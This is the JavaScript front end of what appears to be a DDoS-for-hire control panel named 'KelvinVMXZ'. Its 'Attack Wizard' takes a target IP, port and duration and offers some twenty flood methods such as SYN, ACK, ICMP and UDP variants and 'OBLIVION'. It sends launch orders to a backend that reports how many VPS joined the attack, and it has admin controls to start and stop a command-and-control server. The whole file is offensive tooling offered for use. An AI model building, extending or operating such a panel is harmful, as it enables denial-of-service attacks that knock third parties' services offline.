document.addEventListener('DOMContentLoaded', function() {
    const token = localStorage.getItem('token');
    if (token) {
        showDashboard();
    } else {
        showLogin();
    }
});

function showLogin() {
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            });
            
            const data = await response.json();
            
            if (response.ok) {
                localStorage.setItem('token', data.token);
                localStorage.setItem('user', JSON.stringify(data.user));
                showDashboard();
            } else {
                document.getElementById('errorMessage').textContent = data.error || 'Login failed';
            }
        } catch (error) {
            document.getElementById('errorMessage').textContent = 'Network error';
        }
    });
}

function showDashboard() {
    const token = localStorage.getItem('token');
    if (!token) return;
    
    fetch('/api/status', {
        headers: {
            'Authorization': `Bearer ${token}`
        }
    })
    .then(response => response.json())
    .then(data => {
        renderDashboard(data);
        initializeEventListeners();
    })
    .catch(error => {
        console.error('Error:', error);
        showLogin();
    });
}

function renderDashboard(data) {
    const container = document.getElementById('app');
    container.innerHTML = `
        <div class="container">
            <div class="sidebar">
                <div class="logo">
                    <img src="img/logo.png" alt="KelvinVMXZ">
                    <h2>KelvinVMXZ</h2>
                </div>
                <div class="menu-item active" onclick="showSection('dashboard')">Dashboard</div>
                <div class="menu-item" onclick="showSection('attack')">Attack Hub</div>
                <div class="menu-item" onclick="showSection('vps')">VPS Management</div>
                <div class="menu-item" onclick="showSection('history')">Attack History</div>
                <div class="menu-item" onclick="showSection('admin')">Admin Control</div>
                <div class="menu-item" onclick="logout()">Logout</div>
            </div>
            <div class="main-content">
                <div id="dashboard" class="content-section">
                    <h2 class="section-title">Dashboard</h2>
                    <div class="dashboard-stats">
                        <div class="stat-card">
                            <div class="stat-value">${data.vps_count}</div>
                            <div class="stat-label">Active VPS</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value">${data.ongoing_attacks}</div>
                            <div class="stat-label">Ongoing Attacks</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value">${data.premium_users}</div>
                            <div class="stat-label">Premium Users</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value">${data.total_methods}</div>
                            <div class="stat-label">Attack Methods</div>
                        </div>
                    </div>
                    <div class="status-indicator">
                        <span class="status-badge ${data.cnc_status.includes('ACTIVE') ? 'status-running' : 'status-stopped'}">
                            ${data.cnc_status}
                        </span>
                    </div>
                </div>
                
                <div id="attack" class="content-section" style="display: none;">
                    <h2 class="section-title">Attack Wizard</h2>
                    <div class="form-group">
                        <label>Target IP:</label>
                        <input type="text" id="targetIp" placeholder="Enter target IP">
                    </div>
                    <div class="form-group">
                        <label>Target Port:</label>
                        <input type="text" id="targetPort" placeholder="Enter target port (default: 80)">
                    </div>
                    <div class="form-group">
                        <label>Duration:</label>
                        <input type="text" id="duration" placeholder="Enter duration in seconds">
                    </div>
                    <div class="method-selection">
                        <h3>Select Attack Method:</h3>
                        <button class="method-btn method-syn" onclick="selectMethod('syn-pps')">SYN-PPS</button>
                        <button class="method-btn method-syn" onclick="selectMethod('syn-gbps')">SYN-GBPS</button>
                        <button class="method-btn method-ack" onclick="selectMethod('ack-pps')">ACK-PPS</button>
                        <button class="method-btn method-ack" onclick="selectMethod('ack-gbps')">ACK-GBPS</button>
                        <button class="method-btn method-icmp" onclick="selectMethod('icmp-pps')">ICMP-PPS</button>
                        <button class="method-btn method-icmp" onclick="selectMethod('icmp-gbps')">ICMP-GBPS</button>
                        <button class="method-btn method-rand" onclick="selectMethod('rand-udp')">RAND-UDP</button>
                        <button class="method-btn method-rand" onclick="selectMethod('rand-syn')">RAND-SYN</button>
                        <button class="method-btn method-rand" onclick="selectMethod('rand-ack')">RAND-ACK</button>
                        <button class="method-btn method-rand" onclick="selectMethod('rand-frpu')">RAND-FRPU</button>
                        <button class="method-btn method-icmp" onclick="selectMethod('icmp-ts')">ICMP-TS</button>
                        <button class="method-btn method-rand" onclick="selectMethod('rand-icmp')">RAND-ICMP</button>
                        <button class="method-btn method-rand" onclick="selectMethod('udp-multi')">UDP-MULTI</button>
                        <button class="method-btn method-rand" onclick="selectMethod('udp-sip')">UDP-SIP</button>
                        <button class="method-btn method-rand" onclick="selectMethod('syn-rand')">SYN-RAND</button>
                        <button class="method-btn method-rand" onclick="selectMethod('ack-rmac')">ACK-RMAC</button>
                        <button class="method-btn method-file" onclick="selectMethod('file-attack')">FILE-ATTACK</button>
                        <button class="method-btn method-rand" onclick="selectMethod('syn-multi')">SYN-MULTI</button>
                        <button class="method-btn method-rand" onclick="selectMethod('icmp-rand')">ICMP-RAND</button>
                        <button class="method-btn method-rand" onclick="selectMethod('ack-rand')">ACK-RAND</button>
                        <button class="method-btn method-oblivion" onclick="selectMethod('oblivion')">OBLIVION</button>
                    </div>
                    <button class="btn btn-primary" onclick="launchAttack()">Launch Attack</button>
                </div>
                
                <div id="vps" class="content-section" style="display: none;">
                    <h2 class="section-title">VPS Management</h2>
                    <button class="btn btn-success" onclick="refreshVPSStatus()">Refresh Status</button>
                    <div id="vpsStatus"></div>
                </div>
                
                <div id="history" class="content-section" style="display: none;">
                    <h2 class="section-title">Attack History</h2>
                    <div id="attackHistory"></div>
                </div>
                
                <div id="admin" class="content-section" style="display: none;">
                    <h2 class="section-title">Admin Control</h2>
                    <div class="form-group">
                        <button class="btn btn-success" onclick="startCNC()">Start CNC</button>
                        <button class="btn btn-danger" onclick="stopCNC()">Stop CNC</button>
                    </div>
                    <div class="form-group">
                        <button class="btn btn-primary" onclick="showOngoingAttacks()">View Ongoing Attacks</button>
                    </div>
                </div>
            </div>
        </div>
    `;
}

function initializeEventListeners() {
    // Event listeners are initialized in renderDashboard
}

function showSection(sectionId) {
    const sections = document.querySelectorAll('.content-section');
    sections.forEach(section => {
        section.style.display = 'none';
    });
    document.getElementById(sectionId).style.display = 'block';
}

function logout() {
    localStorage.removeItem('token');
    localStorage.removeItem('user');
    showLogin();
}

let selectedMethod = '';

function selectMethod(method) {
    selectedMethod = method;
    // Visual feedback
    document.querySelectorAll('.method-btn').forEach(btn => {
        btn.style.opacity = '0.7';
    });
    event.target.style.opacity = '1';
}

async function launchAttack() {
    const targetIp = document.getElementById('targetIp').value;
    const targetPort = document.getElementById('targetPort').value || '80';
    const duration = document.getElementById('duration').value;
    
    if (!targetIp || !duration || !selectedMethod) {
        alert('Please fill all fields and select a method');
        return;
    }
    
    try {
        const response = await fetch('/api/attack', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${localStorage.getItem('token')}`
            },
            body: JSON.stringify({
                target: targetIp,
                port: targetPort,
                time: duration,
                method: selectedMethod
            })
        });
        
        const data = await response.json();
        if (response.ok) {
            alert(`Attack launched successfully! ${data.success} VPS started the attack.`);
        } else {
            alert(`Error: ${data.error}`);
        }
    } catch (error) {
        alert('Network error');
    }
}

async function refreshVPSStatus() {
    try {
        const response = await fetch('/api/vps/status', {
            headers: {
                'Authorization': `Bearer ${localStorage.getItem('token')}`
            }
        });
        
        const data = await response.json();
        document.getElementById('vpsStatus').innerHTML = `
            <pre>${data.status}</pre>
            <p>Active VPS: ${data.active_vps}/${data.total_vps}</p>
        `;
    } catch (error) {
        alert('Error refreshing VPS status');
    }
}

async function startCNC() {
    try {
        const response = await fetch('/api/cnc/start', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${localStorage.getItem('token')}`
            }
        });
        
        const data = await response.json();
        if (response.ok) {
            alert('CNC started successfully');
            showDashboard();
        } else {
            alert(`Error: ${data.error}`);
        }
    } catch (error) {
        alert('Network error');
    }
}

async function stopCNC() {
    try {
        const response = await fetch('/api/cnc/stop', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${localStorage.getItem('token')}`
            }
        });
        
        const data = await response.json();
        if (response.ok) {
            alert('CNC stopped successfully');
            showDashboard();
        } else {
            alert(`Error: ${data.error}`);
        }
    } catch (error) {
        alert('Network error');
    }
}

async function showOngoingAttacks() {
    try {
        const response = await fetch('/api/ongoing-attacks', {
            headers: {
                'Authorization': `Bearer ${localStorage.getItem('token')}`
            }
        });
        
        const data = await response.json();
        let html = '<table class="table"><thead><tr><th>ID</th><th>Target</th><th>Method</th><th>User</th><th>Start Time</th><th>Status</th></tr></thead><tbody>';
        
        data.attacks.forEach(attack => {
            html += `<tr>
                <td>${attack.id}</td>
                <td>${attack.target}</td>
                <td>${attack.method}</td>
                <td>${attack.user_id}</td>
                <td>${attack.start_time}</td>
                <td><span class="status-badge status-running">RUNNING</span></td>
            </tr>`;
        });
        
        html += '</tbody></table>';
        document.getElementById('attackHistory').innerHTML = html;
    } catch (error) {
        alert('Error loading ongoing attacks');
    }
}
